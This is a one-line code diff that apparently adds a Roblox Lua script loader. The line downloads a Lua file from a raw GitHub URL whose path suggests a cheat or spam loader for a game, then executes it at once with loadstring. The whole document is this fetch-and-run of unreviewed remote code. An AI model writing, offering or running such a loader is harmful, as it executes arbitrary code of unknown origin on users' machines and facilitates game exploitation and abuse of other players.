@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/forsaken-spam6-ba2c8ev0lzxrv0.lua"))()
